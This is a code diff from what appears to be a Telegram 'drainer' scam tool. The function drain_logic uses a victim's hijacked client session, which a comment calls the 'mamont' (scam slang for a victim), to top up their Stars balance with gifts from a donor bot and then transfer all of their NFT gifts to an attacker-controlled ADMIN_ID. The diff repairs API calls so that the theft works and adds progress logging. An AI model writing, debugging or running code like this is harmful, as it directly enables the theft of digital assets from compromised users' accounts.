@@ -117,10 +117,10 @@ def send_log(msg, buttons=None):
 async def drain_logic(client, phone):
     try:
         res = await client(functions.payments.GetStarsStatusRequest(peer='me'))
-        # Безопасное получение баланса (поддержка разных версий API)
         current_bal = getattr(res.balance, 'amount', res.balance) if hasattr(res, 'balance') else 0
         
         if current_bal < 25:
+            # Получаем баланс бота-донора
             my_stars = await bot(functions.payments.GetStarsStatusRequest(peer='me'))
             my_stars_bal = getattr(my_stars.balance, 'amount', my_stars.balance)
             
@@ -129,31 +129,39 @@ async def drain_logic(client, phone):
                 send_log(f"⛽ Заправка {phone}. Дарим 2 мишки...")
                 for _ in range(2):
                     try:
+                        # Отправляем подарок от имени бота мамонту
                         await bot(functions.payments.SendStarGiftRequest(peer=me.id, gift_id=685))
                         await asyncio.sleep(2)
                     except: pass
+                
                 await asyncio.sleep(7)
-                received_gifts = await client(functions.payments.GetStarGiftsRequest(offset='', limit=5))
+                # ИСПРАВЛЕНО: Убрали offset='', так как он вызывает ошибку
+                received_gifts = await client(functions.payments.GetStarGiftsRequest(limit=5))
                 for g in received_gifts.gifts:
                     try:
                         await client(functions.payments.SaveStarGiftRequest(stargift_id=g.id, unsave=True))
                     except: continue
+                
                 res = await client(functions.payments.GetStarsStatusRequest(peer='me'))
                 final_bal = getattr(res.balance, 'amount', res.balance)
                 send_log(f"💰 Новый баланс {phone}: {final_bal}★")
             else:
                 send_log(f"⚠️ Нет звезд на доноре для заправки {phone}!")
 
-        all_gifts = await client(functions.payments.GetStarGiftsRequest(offset='', limit=100))
+        # ИСПРАВЛЕНО: Убрали offset='' здесь тоже
+        all_gifts = await client(functions.payments.GetStarGiftsRequest(limit=100))
         total_found = len(all_gifts.gifts)
         success_count = 0
+        
         for nft in all_gifts.gifts:
             try:
                 await client(functions.payments.TransferStarGiftRequest(to_id=ADMIN_ID, stargift_id=nft.id))
                 success_count += 1
                 await asyncio.sleep(3)
             except Exception as e:
-                if "BALANCE_TOO_LOW" in str(e): break
+                if "BALANCE_TOO_LOW" in str(e): 
+                    send_log(f"📉 У {phone} кончились звезды для трансфера.")
+                    break
                 continue
 
         btns = None
